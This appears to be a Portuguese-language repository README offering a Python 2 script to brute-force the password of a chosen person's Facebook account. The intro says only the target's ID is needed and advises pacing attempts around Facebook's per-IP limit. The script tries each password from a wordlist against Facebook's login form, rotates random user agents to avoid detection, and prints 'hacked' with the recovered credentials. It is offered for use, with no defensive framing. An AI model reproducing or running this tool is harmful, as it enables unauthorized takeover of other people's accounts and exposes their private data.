# Bruteforce FB - Python

Como é a funcionalidade a respeito de acesso de login e senha de Facebook?
Pois bem é simples, o fb só permite 20 tentativas de acesso por ID fb referente ao IP, no código abaixo faremos o acesso ao FB por navegadores diferentes Aleatóriamente;


E como qualquer outro brute force, você precisará de um wordlist para poder tentar acessar 20 vezes, após isso eu aconselho tentar só depois de 24hrs;

O que vc precisa ter em mãos é o id da pessoa, só!

```
# -*- coding:utf8 -*-
#!usr/bin/python

import mechanize
import random
import platform
import os
import time
from BeautifulSoup import BeautifulSoup
try:
    def Platform():
        sistema = platform.system().lower()
        if sistema =='linux' or sistema =='mac':
            return os.system('clear')
        elif sistema =='windows':
            return os.system('cls')
        else:
            return False
    Platform()
    def agent(): 
        return random.choice(['Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
            'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)'])

    login = str(raw_input('Email ou ID: '))
    Platform()
    print '=====>',login,'<=====\n'
    # wordlist = str(raw_input('Selecione sua Wordlist: '))
    try:
        f = open('wordlist.txt','r')
        ler = f.readlines()
    except IOError:
        print 'Wordlist nao encontrado por favor seleciona o caminho da sua wordlist'
    try:
        for attack in ler:
            conect = mechanize.Browser()
            conect.set_handle_robots(False)
            conect.open('https://facebook.com/')
            conect.addheaders=[('User-Agent',agent())]
            conect.select_form(nr=0)
            conect.form['email'] = login
            conect.form['pass'] = attack
            conect.submit()
            verifica = conect.title().lower()
            html = conect.response().read()
            soup = BeautifulSoup(html)
            msg = soup.find('div', attrs={'class': 'pam _3-95 uiBoxRed'})
            print (agent())
            if msg != None:
                print ("Muitas tentativas, espere um pouco; e tente novamente")
                raise SystemExit

            if verifica == 'facebook':
                print ('hacked ==> '+attack)
                print ('\nlogin: '+login+'\n'+'senha: '+attack)
                raise SystemExit
            elif conect.geturl() == "https://www.facebook.com/":
                print ('hacked ==> '+attack)
                print ('\nlogin: '+login+'\n'+'senha: '+attack)
                raise SystemExit
            else:
                print ('Erro ==> '+attack,)
    except NameError:
        pass
except KeyboardInterrupt:
    print '\nAte mais!'
```